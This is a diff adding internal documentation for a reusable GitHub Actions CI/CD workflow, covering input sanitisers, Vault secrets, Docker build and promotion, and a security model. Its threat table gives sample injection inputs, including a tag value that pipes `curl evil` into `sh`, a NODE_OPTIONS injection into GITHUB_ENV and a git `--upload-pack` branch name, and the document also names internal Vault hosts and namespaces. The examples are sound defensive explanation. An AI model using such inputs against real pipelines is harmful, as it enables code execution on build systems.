+safe_ticket="$(sanitize_no_newlines "$SN_CHANGE_TICKET_INPUT")"
+```
+
+| Input | Output |
+|---|---|
+| `CHG0012345` | `CHG0012345` |
+| `CHG1⏎EVIL=1` | `CHG1EVIL=1`, which then fails the `^[A-Za-z0-9_-]+$` check because of `=` |
+
+> The same one-liner, `printf '%s' "$X" | tr -d '\n\r'`, is also written **inline** in the ENVIRONMENT (L75), Resolve-ref (L126), BUILD_TYPE (L269), tag (L285) and JFrog log-level (L396) steps.
+
+### 10.2 `sanitize_env_value`
+
+**Defined in:** `Sanitize workflow inputs for shell usage` (L308-323)
+
+```bash
+sanitize_env_value() {
+  raw="$1"
+  cleaned="$(printf '%s' "$raw" | tr -d '\n\r')"
+  if printf '%s' "$cleaned" | grep -q '='; then
+    echo "FATAL ERROR - Invalid character '=' in sanitized value: $cleaned" ; exit 1 ;
+  fi
+  if ! printf '%s' "$cleaned" | grep -Eq '^[A-Za-z0-9._:/-]*$'; then
+    echo "FATAL ERROR - Sanitized value contains disallowed characters: $cleaned" ; exit 1 ;
+  fi
+  printf '%s' "$cleaned"
+}
+```
+
+```mermaid
+flowchart LR
+    A["raw"] --> B["strip CR/LF"] --> C{"contains '=' ?"}
+    C -- yes --> X1["❌ exit 1"]
+    C -- no --> D{"only A-Z a-z 0-9 . _ : / - ?"}
+    D -- no --> X2["❌ exit 1"]
+    D -- yes --> E["print cleaned"]
+```
+
+| | |
+|---|---|
+| **Purpose** | General-purpose "safe for `$GITHUB_ENV` and for URLs" filter. |
+| **Input** | `$1`: raw value (may be empty) |
+| **Output** | stdout: cleaned value |
+| **Allowed chars** | letters, digits, `.` `_` `:` `/` `-`. **Empty is allowed** (`*` in the regex). |
+
+> ⚠️ **Subtle bash gotcha:** the function is called inside `$( … )`, which runs in a **subshell**, so `exit 1` exits only the subshell, not the step. The step still fails, for a different reason: GitHub runs `run:` scripts with `bash -e`, and when the command substitution in a plain assignment (`x="$(f)"`) fails, the assignment fails too, which stops the script. But the `FATAL ERROR` text was printed to the subshell's **stdout**, which is captured into the variable instead of reaching the log. Result: the step fails, but the log **does not show the helpful message**. (`require_pattern` does not have this problem, because it is called directly, not inside `$( )`.)
+
+**Usage:**
+
+```bash
+safe_repository_name="$(sanitize_env_value "$REPOSITORY_NAME_INPUT")"
+safe_jf_saas_central_docker_base_url="$(sanitize_env_value "$JF_SAAS_CENTRAL_DOCKER_BASE_URL_INPUT")"
+```
+
+| Input | Result |
+|---|---|
+| `claims-extract-comparison-tool-ui-2-0` | ✅ unchanged |
+| `myco.jfrog.io` | ✅ unchanged |
+| `https://x` | ✅ (`:` and `/` allowed) |
+| `a=b` | ❌ `=` |
+| `ui v2` | ❌ space |
+| *(empty)* | ✅ empty (then `require_pattern` rejects it where `+` is required) |
+
+### 10.3 `require_pattern`
+
+**Defined in:** `Sanitize workflow inputs for shell usage` (L325-333)
+
+```bash
+require_pattern() {
+  local label="$1"
+  local value="$2"
+  local pattern="$3"
+  if ! [[ "$value" =~ $pattern ]]; then
+    echo "FATAL ERROR - Invalid $label value: $value" ; exit 1 ;
+  fi
+}
+```
+
+| | |
+|---|---|
+| **Purpose** | Assert that a value matches a field-specific regex, with a readable error label. |
+| **Inputs** | `$1` label for the message · `$2` value · `$3` extended regex |
+| **Output** | none; exits the **step** with status 1 on mismatch (called directly, not in a subshell) |
+| **Why `$pattern` unquoted?** | Inside `[[ =~ ]]`, a **quoted** right-hand side is matched as a literal string. Leaving it unquoted makes bash treat it as a regex. This is intentional. |
+
+**Usage (L342-350):**
+
+```bash
+require_pattern "repository name"              "$safe_repository_name"                 '^[A-Za-z0-9._-]+$'
+require_pattern "artifact type"                "$safe_artifact_type"                   '^[A-Za-z0-9._-]+$'
+require_pattern "JFrog docker namespace"       "$safe_jf_saas_docker_namespace"        '^[A-Za-z0-9._/-]+$'
+require_pattern "JFrog central docker base URL" "$safe_jf_saas_central_docker_base_url" '^[A-Za-z0-9._:/-]+$'
+require_pattern "JFrog edge docker base URL"   "$safe_jf_saas_edgeint_docker_base_url" '^[A-Za-z0-9._:/-]+$'
+[ -n "$safe_docker_image_tag" ] &amp;&amp; require_pattern "docker image tag" "$safe_docker_image_tag" '^[A-Za-z0-9._-]+$'
+```
+
+*(The last line is condensed from an `if … fi` block.)*
+
+`sanitize_env_value` is the **generic** gate, and `require_pattern` is the **tighter, per-field** gate. For example, the repository name may not contain `/` or `:`, even though the generic gate allows them.
+
+### 10.4 `escape_sed_replacement`
+
+**Defined in:** `Pre-deploy update K8S deployment file` (L547-549)
+
+```bash
+escape_sed_replacement() {
+  printf '%s' "$1" | sed -e 's/[\\|&amp;]/\\\\&amp;/g'
+}
+```
+
+| | |
+|---|---|
+| **Purpose** | Make an arbitrary value safe to use as the **replacement** part of `sed "s|pattern|replacement|"`. |
+| **Escapes** | `\` (escape char), `\|` (the delimiter used here), `&amp;` (sed's "whole match" token) by prefixing a backslash |
+| **Input / Output** | `$1` raw → stdout escaped |
+
+Without it, an image URL containing `&amp;` would be expanded by sed into the matched placeholder, and a `|` would end the `s` command early and corrupt the manifest.
+
+**Usage:**
+
+```bash
+sed -i "s|##docker-image-url##|$(escape_sed_replacement "$JF_SAAS_EDGEINT_DOCKER_IMAGE_URL_INPUT")|" -- "$K8S_DEPLOY_FILE_INPUT"
+```
+
+| Input | Output |
+|---|---|
+| `host/a/b:1.0` | `host/a/b:1.0` |
+| `a&amp;b` | `a\&amp;b` |
+| `a\|b` | `a\\|b` |
+
+The `--` before the filename tells `sed` that what follows is a filename, not an option. That protects against a filename starting with `-`.
+
+### 10.5 Inline idioms (not functions, but used everywhere)
+
+| Idiom | Example | Purpose |
+|---|---|---|
+| `printf 'K=%s\n' "$v" >> "$GITHUB_ENV"` | L68, L78, … | Write exactly one env line; `%s` prevents format-string surprises. |
+| `case "$x" in a\|b) … ;; *) exit 1 ;; esac` | L76, L227, L270, L399 | **Allow-list** validation, clearer and safer than regex for a closed set. |
+| `[[ "$x" =~ ^[A-Za-z0-9._-]+$ ]]` | L240, L288 | Regex validation. |
+| `git check-ref-format --branch` | L150 | Use Git's own branch-name rules. |
+| `${var#refs/heads/}` | L142 | Bash prefix removal. |
+| `TZ=":US/Central" date +"%m%d%Y_%H"` | L67 | Timestamp in Central time. |
+| `base64 -w 0` | L165 | One-line base64 (no wrapping), safe for `$GITHUB_ENV`. |
+| `tr '[:lower:]' '[:upper:]'` | L397 | Normalise log level to upper case. |
+
+---
+
+## 11. Third-party action reference (every `uses:`)
+
+| # | Action @ version | Step (line) | Key inputs used here | Outputs consumed | Notes |
+|---|---|---|---|---|---|
+| 1 | `actions/checkout@v4` | Checkout (L157) | `ref`, `fetch-depth: 1`, `persist-credentials: false` | — | GitHub official. |
+| 2 | `optum-rx-tech-ops/devsecops-custom-hashivault-action@v3` | Vault (L169) | `url`, `caCertificate`, `method: jwt`, `jwtGithubAudience`, `role`, `namespace`, `values`, `secrets` | env vars | Org-owned custom action. |
+| 3 | `actions/setup-java@v5` | JDK (L386) | `java-version`, `distribution` | — | GitHub official. |
+| 4 | `uhg-pipelines/epl-jf/configure-saas-connection@v4` | JFrog (L411) | `jfrog-edge-url`, `jfrog-url`, `jfrog-project-key`, `npm-setup: true` | `access-token`, `oidc-subject`, `jfrog-build-name`, `jfrog-build-number`, `jfrog-docker-repository` | OIDC → JFrog token. |
+| 5 | `uhg-pipelines/setup-maven@v1` | Maven (L420) | `maven-version`, `base-download-url`, `jfrog-token` | — | Downloads Maven via Artifactory. |
+| 6 | `uhg-pipelines/epl-maven/build-scan@v3` | Maven build (L429) | `maven-command`, `jfrog-*`, `enable-sonar: true`, `maven-deploy: false` | — | Upgraded from v1 for SonarQube. |
+| 7 | `uhg-pipelines/epl-prm/get-secret@v3` | Prisma creds (L444) | `prm-base-url`, `ignore-not-found: false`, `prm-secret-map` | env `PRISMA_ACCESS_KEY_ID`, `PRISMA_ACCESS_KEY` | |
+| 8 | `docker/login-action@v3` ×3 | Logins (L454, L462, L470) | `registry`, `username`, `password` | — | Third duplicate is redundant. |
+| 9 | `uhg-pipelines/epl-docker/build-scan-push@v4` | Build/scan/push (L479) | see [G3](#g3-docker-build-scan-and-push-l477-506) | — | Build + Xray + Prisma + push. |
+| 10 | `uhg-pipelines/epl-service-now/validate-change-window@v1` | SN (L510) | `servicenow-host`, `servicenow-user`, `servicenow-token`, `change-ticket` | — | Prod gate. |
+| 11 | `uhg-pipelines/epl-kubectl/apply@v1` | Deploy (L559) | `kube-config`, `filename` | — | |
+| 12 | `uhg-pipelines/epl-maven/build-scan@v1` | Flyway (L567) | `maven-command`, `enable-sonar: false` | — | Older major version than #6. |
+| 13 | `uhg-pipelines/epl-send-mail@v1` | Email (L581) | `subject`, `to`, `from`, `body` | — | |
+| 14 | `uhg-pipelines/privileged-workflows/.github/workflows/promote-docker-image.yaml@v3` | Job 2 (L606) | `jfrog-project-key`, `jfrog-url`, `source-docker-image-name`, `source-docker-image-tag`, `promotion-type: release` | — | A reusable **workflow**, not an action. |
+
+> 📌 Every action is pinned to a **major-version tag** (`@v4`), not a commit SHA. That is convenient, since you get fixes automatically, but a compromised or broken re-tag would flow straight in. UHG EPL actions are internally governed, which reduces this risk.
+
+---
+
+## 12. Data flow: where every variable comes from
+
+```mermaid
+flowchart LR
+    subgraph SRC["Sources"]
+      IN["inputs.*&lt;br/>(caller form)"]
+      GHC["github.*&lt;br/>(caller context)"]
+      VA["Vault kv/data/ci-cd"]
+      VE["Vault kv/data/ENV"]
+      PRMS["PRM"]
+      JF["JFrog OIDC exchange"]
+      FS["Runner filesystem&lt;br/>(CA bundle)"]
+    end
+    subgraph SAFE["Sanitised env vars"]
+      SE["SAFE_ENVIRONMENT"]
+      SB["SAFE_BUILD_TYPE"]
+      ST["SAFE_DOCKER_IMAGE_TAG"]
+      SR["SAFE_REPOSITORY_NAME / SAFE_ARTIFACT_TYPE"]
+      SU["SAFE_JF_SAAS_* URLs / namespace"]
+      CR["CHECKOUT_REF"]
+      SN["SN_CHANGE_TICKET"]
+    end
+    subgraph DER["Derived"]
+      SUF["DOCKER_IMAGE_SUFFIX&lt;br/>DOCKER_IMG_SUFFIX_NO_NAMESPACE"]
+      URL["JF_SAAS_CENTRAL_DOCKER_IMAGE_URL&lt;br/>JF_SAAS_EDGEINT_DOCKER_IMAGE_URL"]
+      OUT["job outputs"]
+    end
+    subgraph USE["Consumers"]
+      CO["checkout"]
+      VS["Vault paths"]
+      DK["docker build/push"]
+      K8["K8s template + kubectl"]
+      SNV["ServiceNow"]
+      PROM["promote job"]
+    end
+    IN --> SE &amp; SB &amp; ST &amp; SN
+    GHC --> CR &amp; SR
+    IN --> SR
+    VA --> SU &amp; SN
+    SE --> VS --> VE
+    SR &amp; SU --> SUF --> URL
+    ST --> URL
+    URL --> DK &amp; K8
+    VE --> K8
+    CR --> CO
+    SN --> SNV
+    PRMS &amp; JF --> DK
+    FS --> VS
+    SUF &amp; ST &amp; SU --> OUT --> PROM
+```
+
+The complete tables are in [Appendix A](#appendix-a--vault-key-catalogue) (Vault keys) and [Appendix B](#appendix-b--environment-variable-catalogue) (every env var).
+
+---
+
+## 13. Sequence diagrams: dev, test, and prod deployments
+
+### 13.1 Dev deployment of the UI (NodeJS)
+
+```mermaid
+sequenceDiagram
+    autonumber
+    actor E as Engineer
+    participant GH as GitHub (caller UI repo)
+    participant R as uhg-runner
+    participant V as Vault
+    participant J as JFrog (central / edge)
+    participant P as Prisma
+    participant K as K8s dev namespace
+    E->>GH: Run workflow (ENV=dev, BUILD_TYPE=NodeJS, tag=R26.11.25)
+    GH->>R: start build-deploy (reusable @main-uhg-only)
+    R->>R: validate inputs, resolve ref, checkout UI repo
+    R->>V: OIDC JWT login, read ci-cd + dev keys
+    V-->>R: values + masked secrets (kube-config, ...)
+    R->>R: deployer check (dev list usually "*")
+    R->>R: compute image .../claims-extract-comparison-tool-ui-2-0-dev:R26.11.25
+    R->>J: OIDC exchange → access token, docker login
+    R->>R: docker build (npm clean-install + npm run build inside)
+    R->>P: Prisma scan
+    R->>J: Xray scan, docker push to central
+    J-->>J: replicate to edge internal
+    R->>R: sed placeholders into deployment.yaml
+    R->>K: kubectl apply
+    K->>J: pull image from edge (jfrog-saas-secret)
+    K-->>K: rolling update, /health-check probes
+    R-->>GH: success (no email in dev, no promote)
+```
+
+### 13.2 Test deployment of the API (Maven)
+
+```mermaid
+sequenceDiagram
+    autonumber
+    actor E as Engineer
+    participant R as uhg-runner
+    participant V as Vault
+    participant S as SonarQube
+    participant J as JFrog
+    participant K as K8s test namespace
+    participant M as Mail
+    E->>R: Run (ENV=test, Maven, tag=R26.11.25) from main
+    R->>R: branch check: ref must be refs/heads/main
+    R->>V: read ci-cd + test keys
+    R->>R: setup JDK + Maven (via JFrog)
+    R->>R: mvn clean install -Drevision=R57.1-sha
+    R->>S: Sonar analysis
+    R->>J: docker build (COPY target/*.jar), Xray + Prisma, push .../api/claims-extract-comparison-tool-api:R26.11.25
+    R->>K: sed + kubectl apply
+    R->>M: "Test Deployment Notification"
+```
+
+### 13.3 Production deployment (no build, ticket gate, promotion)
+
+```mermaid
+sequenceDiagram
+    autonumber
+    actor E as Engineer
+    participant R as uhg-runner (job 1)
+    participant V as Vault
+    participant SN as ServiceNow
+    participant K as K8s prod namespace
+    participant J as JFrog edge / central
+    participant P as privileged promote (job 2)
+    participant M as Mail
+    E->>R: Run (ENV=prod, tag=R26.11.25, SN_CHANGE_TICKET=CHG...) from main
+    R->>R: branch = main? ticket non-empty? (fail fast)
+    R->>V: read ci-cd + prod keys (prod deployer list, prod kube-config)
+    R->>R: deployer check against prod list
+    Note over R: No JDK, no Maven, no docker build, no scan
+    R->>SN: validate change window (approved + in window)
+    SN-->>R: OK
+    R->>R: outputs: run-promote = true
+    R->>R: sed image = edge/.../repo:R26.11.25 (same image test used)
+    R->>K: kubectl apply
+    K->>J: pull image from edge
+    R->>M: "Production Deployment Notification" (+ ticket)
+    R-->>P: needs build-deploy, outputs
+    P->>J: promote repo/artifact/repo:R26.11.25 → release repository
+```
+
+---
+
+## 14. Docker image lifecycle &amp; promotion
+
+```mermaid
+stateDiagram-v2
+    [*] --> Source: commit on main
+    state "Built (dev run)&lt;br/>…/repo-dev:tag" as DevImg
+    state "Built + scanned (test run)&lt;br/>…/repo:tag" as TestImg
+    state "Pushed to JFrog central" as Central
+    state "Replicated to edge internal" as Edge
+    state "Running in test" as RunTest
+    state "Running in prod" as RunProd
+    state "Promoted to release repo" as Released
+    Source --> DevImg: ENV=dev
+    DevImg --> [*]: dev only, separate image name
+    Source --> TestImg: ENV=test
+    TestImg --> Central: Xray + Prisma pass
+    Central --> Edge
+    Edge --> RunTest: kubectl apply (test)
+    RunTest --> RunProd: ENV=prod with SAME tag + change ticket
+    RunProd --> Released: job 2 promote
+    Released --> [*]
+```
+
+**What this means in practice:**
+
+1. A **dev** image (`…-dev:tag`) can **never** reach prod: its name is different.
+2. To ship to prod, first run **test** with tag `X`. When regression passes, run **prod** with the **same tag `X`**.
+3. If you run prod with a tag that test never built, `kubectl apply` still succeeds, but the pods go into **`ImagePullBackOff`**. The workflow does not check that the tag exists (§18 #8).
+4. Re-running test with an **existing** tag overwrites that tag in the registry. Use a fresh tag per build (e.g. `R26.11.25`, `R26.11.25.1`).
+
+---
+
+## 15. Security model
+
+### 15.1 Defence-in-depth layers
+
+```mermaid
+flowchart TB
+    subgraph L1["Layer 1 · Who can trigger"]
+      a1["Repo write access (workflow_dispatch)"]
+      a2["DEPLOYERS_GHEC_USER_ID_LIST per env (Vault)"]
+    end
+    subgraph L2["Layer 2 · What code runs"]
+      b1["test/prod only from refs/heads/main"]
+      b2["No PR refs, no fully-qualified refs"]
+      b3["git check-ref-format"]
+      b4["BRANCH override dev-only"]
+    end
+    subgraph L3["Layer 3 · Input hygiene"]
+      c1["Expressions → env: → quoted $VAR"]
+      c2["CR/LF stripping before GITHUB_ENV"]
+      c3["Allow-lists (case) + regex (require_pattern)"]
+      c4["Vault values sanitised too"]
+      c5["sed replacement escaping"]
+    end
+    subgraph L4["Layer 4 · Secrets"]
+      d1["OIDC → Vault JWT (no stored passwords)"]
+      d2["secrets: masked in logs"]
+      d3["persist-credentials: false"]
+      d4["BuildKit secrets, not build args"]
+    end
+    subgraph L5["Layer 5 · Artifact &amp; change control"]
+      e1["Xray + Prisma must pass before deploy"]
+      e2["Sonar quality scan"]
+      e3["ServiceNow approved window for prod"]
+      e4["Privileged promote to release"]
+    end
+    L1 --> L2 --> L3 --> L4 --> L5
+```
+
+### 15.2 Threats and how each is handled
+
+| Threat | Example attack | Mitigation in this workflow | Where |
+|---|---|---|---|
+| **Script injection** | Tag input `x"; curl evil \| sh; "` | Inputs go through `env:` and are used as `"$VAR"`, never pasted into `run:` | Every `run:` step |
+| **GITHUB_ENV injection** | Ticket `CHG1\nNODE_OPTIONS=--require=/tmp/x` | Strip `\n\r`, reject `=`, allow-list characters | L75, L126, L222, L269, L285, L308, L396 |
+| **Untrusted code with secrets** | Deploy a fork's PR merge ref | PR-ref patterns rejected; test/prod require `main` | L86, L133-138 |
+| **Ref / option injection** | Branch `--upload-pack=…` | `git check-ref-format --branch` | L150 |
+| **Credential leakage via repo** | Build step reads `.git/config` token | `persist-credentials: false` | L161 |
+| **Secrets in image layers** | `ARG NPM_TOKEN` baked into a layer | `docker-build-secrets` + `RUN --mount=type=secret` | L489, UI Dockerfile |
+| **Manifest corruption** | Value with `&amp;` or `\|` breaks `sed` | `escape_sed_replacement`, `--` | L547-555 |
+| **Unauthorised prod change** | Deploy outside a change window | ServiceNow validation + non-empty ticket | L247, L508 |
+| **Vulnerable image** | Base image with critical CVE | Xray + Prisma gates; a failure stops the run before deploy | L477 |
+| **Log leakage** | Echo `KUBE_CONFIG` | Listed under `secrets:`, so GitHub masks it | L209-214 |
+
+### 15.3 Script-injection, before and after (for beginners)
+
+```yaml
+# ❌ UNSAFE: the value is pasted into the script text before bash runs
+- run: echo "Deploying ${{ inputs.DOCKER_IMAGE_TAG }}"
+
+# ✅ SAFE (pattern used in this repo): the value is data in an env var
+- env:
+    DOCKER_IMAGE_TAG_INPUT: ${{ inputs.DOCKER_IMAGE_TAG }}
+  run: echo "Deploying $DOCKER_IMAGE_TAG_INPUT"
+```
+
+---
+
+## 16. Design patterns used
+
+| # | Pattern | Where | How it shows up |
+|---|---|---|---|
+| 1 | **Reusable workflow / Template Method** | Whole repo | One fixed algorithm (validate → secrets → build → scan → deploy). Callers fill in the variable parts via inputs. |
+| 2 | **Thin caller / Facade** | Caller workflows | ~50-line callers hide ~600 lines of pipeline behind six inputs. |
+| 3 | **Guard clauses / Fail-fast** | Steps A2-D3, C2 | Cheap checks run **first** and `exit 1`, before any expensive build or risky deploy. |
+| 4 | **Allow-list validation** | `case` blocks, `require_pattern` | Accept only known-good values, rather than trying to block known-bad ones. |
+| 5 | **Strategy via discriminator** | `BUILD_TYPE`, `ENVIRONMENT` in `if:` | The same job behaves differently based on two string keys (see the matrix in §8.1). |
+| 6 | **Build once, deploy many / Immutable artifact** | Test builds, prod reuses tag | Prod deploys the exact bytes that passed test. |
+| 7 | **Artifact promotion** | Job 2 | Moves a proven image into the release repository. |
+| 8 | **Externalised configuration (12-factor)** | Vault `ci-cd` + per-env paths | Same YAML for all environments; behaviour driven by config. |
+| 9 | **Workload identity / Federated credentials** | OIDC → Vault, OIDC → JFrog | No long-lived secrets stored in GitHub. |
+| 10 | **Template + placeholder substitution** | `##…##` in `deployment.yaml` | A simple form of Kustomize/Helm templating. |
+| 11 | **Sanitise-then-publish (taint tracking)** | `X_INPUT` → `SAFE_X` naming | Raw values are named `*_INPUT`; only `SAFE_*` values are written to `$GITHUB_ENV` and reused. |
+| 12 | **Producer → consumer via outputs** | `setoutputs` → `needs.build-deploy.outputs` | Loose coupling between jobs. |
+| 13 | **Privilege separation** | Job 2 calls `privileged-workflows` | Release-repo write permission lives in an enterprise-owned workflow, not here. |
+| 14 | **Branch-per-variant** *(anti-pattern)* | `main`, `main-uhg-only`, `api-only` | Variants live as long-lived branches instead of inputs, which causes drift (§18 #1). |
+
+---
+
+## 17. Runbooks: "How do I…?"
+
+### 17.1 Deploy the UI to dev
+
+1. Open **claims-extract-comparison-tool-ui-2-0** → **Actions** → **ORx QEC CECT UI build and deploy**.
+2. Click **Run workflow**. Pick your branch in "Use workflow from".
+3. ENVIRONMENT `dev`, BUILD_TYPE `NodeJS`, ARTIFACT_TYPE `ui`, DOCKER_IMAGE_TAG e.g. `R26.11.25-mybranch`, leave DOCKER_FILE as is.
+4. Watch the run. When it is green, check pods in the dev namespace.
+
+### 17.2 Promote a build to test
+
+1. Merge to `main`.
+2. Run the caller from **`main`** with ENVIRONMENT `test` and a **new** tag, e.g. `R26.11.25`.
+3. Wait for the email and run regression tests.
+
+### 17.3 Release to prod
+
+1. Raise and get approval for a **ServiceNow change**; note its number (`CHG…`).
+2. During the approved window, run the caller from **`main`** with ENVIRONMENT `prod`, the **same tag** that passed test, and `SN_CHANGE_TICKET`.
+3. Confirm job 2 (*promote-docker-image-to-release*) also went green.
+
+### 17.4 Add a new value from Vault
+
+1. Add the key in Vault (`kv/data/ci-cd` for shared, `kv/data/&lt;env>` for per-env) in namespace `OPTUM/APP/CECT/STAGE`.
+2. Add a line under `values:` (plain) or `secrets:` (masked) at L177-214: `kv/data/ci-cd my-key | MY_VAR ;`.
+3. If you will write it to `$GITHUB_ENV` or use it in a path, URL or `sed`, run it through `sanitize_env_value` + `require_pattern` first.
+4. Cherry-pick to `main-uhg-only` / `api-only` as needed.
+
+### 17.5 Add a new workflow input
+
+1. Add it under `on.workflow_call.inputs` (L12-45).
+2. **Never** use `${{ inputs.NEW }}` inside `run:`. Map it through `env:` and validate it.
+3. Add it to each caller's `workflow_dispatch.inputs` and `with:`.
+
+### 17.6 Change memory for the API pods
+
+Edit Vault `kv/data/&lt;env>` keys `k8s-api-memory-limits` / `k8s-api-memory-requests`, then redeploy. No code change is needed. (The UI template hard-codes its resources in `deployment.yaml`.)
+
+### 17.7 Debug a failed run
+
+```mermaid
+flowchart TD
+    A["Run failed"] --> B{"Message starts with&lt;br/>FATAL ERROR?"}
+    B -- yes --> C["Look it up in Appendix C"]
+    B -- no --> D{"Which step?"}
+    D -->|Vault| E["OIDC / role / namespace / key missing&lt;br/>check caller has id-token: write"]
+    D -->|"Configure JFrog / docker login"| F["JFrog OIDC mapping, project key, registry URL"]
+    D -->|"Docker Build Scan And Push"| G{"build or scan?"}
+    G -->|build| G1["Reproduce docker build locally&lt;br/>npm auth, base image pull"]
+    G -->|scan| G2["Xray/Prisma policy violation&lt;br/>upgrade base image / deps"]
+    D -->|ServiceNow| H["Ticket not approved or outside window"]
+    D -->|kubectl apply| I["kube-config expired? namespace? YAML invalid after sed?"]
+    D -->|"Green, but app down"| J["kubectl describe pod:&lt;br/>ImagePullBackOff → tag missing&lt;br/>CreateContainerConfigError → ConfigMap/Secret missing&lt;br/>probe failures → /health-check"]
+```
+
+---
+
+## 18. Known issues, tech debt &amp; gotchas
+
+| # | Severity | Issue | Where | Suggested fix |
+|---|---|---|---|---|
+| 1 | 🔴 High | **Three drifting branches** (`main`, `main-uhg-only`, `api-only`), and callers pin **branches**, not tags. Fixes merged to `main` do not reach the UI or API pipelines. | Callers L50 | Converge on one `main`; express variants as inputs; publish **tags** (`v1.2.0`) and pin callers to them. |
+| 2 | 🟠 Medium | Docker build-args use `env.SONAR_PROJECT_KEY` / `env.SONAR_PROJECT_NAME`, which are **never set** (Vault exports `CORE_SONAR_*`). They pass empty strings. | L486-487 (`main`, `main-uhg-only`) | Use `env.CORE_SONAR_PROJECT_KEY` / `env.CORE_SONAR_PROJECT_NAME`, as `api-only` does. |
+| 3 | 🟠 Medium | Duplicate **"Login to JFrog SaaS edge internal"** step using the **unsanitised** `env. JF_SAAS_EDGEINT_UHG_DOCKER_BASE_URL` (stray space). | L468-474 (`main`) | Delete it (already removed on `main-uhg-only`). |
+| 4 | 🟠 Medium | Deployer check uses `contains(&lt;string>, github.actor)`, a **substring** match: user `abc` passes if `abcd` is in the list. | L260 | Store the list comma-wrapped (`,u1,u2,`) and test `contains(list, format(',{0},', github.actor))`, or use `contains(fromJSON(list), github.actor)` with a JSON array. |
+| 5 | 🟠 Medium | Error messages from `sanitize_env_value` are swallowed, because it runs inside `$( … )` and `echo` goes to the captured stdout. | L313-320 | Send errors to stderr: `echo "FATAL…" >&amp;2`. |
+| 6 | 🟡 Low | Vault URL `pam-dev.uhc.com` and namespace `…/STAGE` are used for **prod** too. | L171-176 | Confirm with the platform team that this is intended. |
+| 7 | 🟡 Low | Prod deploys only after secrets are fetched; the **deployer check happens after Vault**. That is unavoidable (the list lives in Vault), but the job already holds `KUBE_CONFIG` at that point. | L168 → L259 | Consider a GitHub **Environment** with required reviewers for prod. |
+| 8 | 🟡 Low | No check that the prod tag **exists** in the registry. A typo deploys an unpullable image, so pods go into `ImagePullBackOff`. | L537-562 | Add a `jf rt search` / `docker manifest inspect` pre-check. |
+| 9 | 🟡 Low | `kubectl apply` success does not mean the rollout succeeded (unless the EPL action waits). | L557 | Add `kubectl rollout status deployment/... --timeout=5m`. |
+| 10 | 🟡 Low | Email recipient is one hard-coded person. | L584 | Move it to Vault (`notify-email`) or a team DL. |
+| 11 | 🟡 Low | Unused values: `DEPLOY_WINDOW_DATE_HOUR`, `APPROVED_TEST_DEPLOY_WINDOW_DATE_HOUR`, ODI-Gov Sonar keys/token, and on non-Flyway runs the DB credentials. | L67, L194, L207-214 | Remove or re-enable the window check. Fetch DB secrets only for Flyway. |
+| 12 | 🟡 Low | `DOCKER_FILE` and `MAVEN_BUILD_COMMAND` are **not validated**. They are passed to EPL actions (not bash), so the risk is low, but they are attacker-influenced. | L28-35 | Allow-list the path pattern and the Maven goals. |
+| 13 | 🟡 Low | Flyway uses `epl-maven/build-scan@v1` while the Maven build uses `@v3`. | L567 vs L429 | Align versions. |
+| 14 | 🟡 Low | `DOCKER_IMAGE_TAG` is optional in the callee. Empty + image build gives a URL ending in `:`. | L25-27 | Fail if empty when BUILD_TYPE is an image type. |
+| 15 | ⚪ Cosmetic | Typos: "Deployement" (L259); ARTIFACT_TYPE description says "Select the build type" (L23); stray `x₹` in a comment on `main-uhg-only`. | — | Fix in passing. |
+| 16 | ⚪ Cosmetic | Top-level and job-level `permissions` are duplicated. | L3-8, L50-55 | Keep one. |
+
+---
+
+## Appendix A — Vault key catalogue
+
+Namespace `OPTUM/APP/CECT/STAGE` at `https://pam-dev.uhc.com`. 🔒 = listed under `secrets:` (masked in logs).
+
+### A.1 Shared: `kv/data/ci-cd`
+
+| Vault key | Env var | Used by |
+|---|---|---|
+| `aide-id` | `AIDE_ID` | build-scan-push `ask-id` |
+| `servicenow-user` | `ORX_CECT_SN_USER` | ServiceNow validation |
+| `servicenow-password` 🔒 | `ORX_CECT_SN_PASSWORD` | ServiceNow validation |
+| `servicenow-change-request` | `CHANGE_NUMBER` | SN ticket for scheduled runs |
+| `docker-build-args` | `DOCKER_BUILD_ARGS` | build-scan-push build-args |
+| `docker-namespace` | `DOCKER_NAMESPACE` | *(unused)* |
+| `java-distribution` | `JAVA_DISTRIBUTION` | setup-java |
+| `java-version` | `JAVA_VERSION` | setup-java |
+| `maven-version` | `MAVEN_VERSION` | setup-maven |
+| `k8s-deploy-file` | `K8S_DEPLOY_FILE` | sed + kubectl apply |
+| `jf-saas-central-docker-base-url` | `JF_SAAS_CENTRAL_DOCKER_BASE_URL` | image URL, JFrog config, login, promote |
+| `jf-saas-edgeint-docker-base-url` | `JF_SAAS_EDGEINT_UHG_DOCKER_BASE_URL` | edge image URL, JFrog config, login |
+| `jf-saas-project-key` | `JF_SAAS_PROJECT_KEY` | JFrog config, Maven, Docker, promote |
+| `jfrog-cli-loglevel` | `JF_CLI_LOG_LEVEL` | → `JFROG_CLI_LOG_LEVEL` |
+| `jf-saas-docker-namespace` | `JF_SAAS_DOCKER_NAMESPACE` | image suffix |
+| `prisma-saas-url` | `PRISMA_SAAS_URL` | build-scan-push `prisma-url` |
+| `maven-flyway-migrate-command` | `MAVEN_FLYWAY_MIGRATE_COMMAND` | Flyway migrate |
+| `approved-test-deploy-window-date-hour` | `APPROVED_TEST_DEPLOY_WINDOW_DATE_HOUR` | *(check commented out)* |
+| `flyway-baseline-on-migrate` | `FLYWAY_BASELINE_ON_MIGRATE` | Flyway (via env) |
+| `flyway-clean-disabled` | `FLYWAY_CLEAN_DISABLED` | Flyway (via env) |
+| `sonar-host-url` | `SONAR_HOST_URL` | Docker build-arg |
+| `core-sonar-project-key` | `CORE_SONAR_PROJECT_KEY` | *(should feed build-arg, see §18 #2)* |
+| `core-sonar-project-name` | `CORE_SONAR_PROJECT_NAME` | *(same)* |
+| `core-sonar-token` 🔒 | `CORE_SONAR_TOKEN` | available to Maven/Sonar via env |
+| `odi-gov-sonar-project-key` | `ODI_GOV_SONAR_PROJECT_KEY` | *(unused on main)* |
+| `odi-gov-sonar-project-name` | `ODI_GOV_SONAR_PROJECT_NAME` | *(unused on main)* |
+| `odi-gov-sonar-token` 🔒 | `ODI_GOV_SONAR_TOKEN` | *(unused on main)* |
+
+### A.2 Per environment: `kv/data/&lt;dev|test|prod>`
+
+| Vault key | Env var | Used by |
+|---|---|---|
+| `deployers-ghec-user-id-list` | `DEPLOYERS_GHEC_USER_ID_LIST` | Deployer check (`*` = anyone) |
+| `k8s-namespace` | `K8S_NAMESPACE` | `##k8s-namespace##` |
+| `k8s-api-memory-limits` | `K8S_API_MEMORY_LIMITS` | `##k8s-api-memory-limits##` |
+| `k8s-api-memory-requests` | `K8S_API_MEMORY_REQUESTS` | `##k8s-api-memory-requests##` |
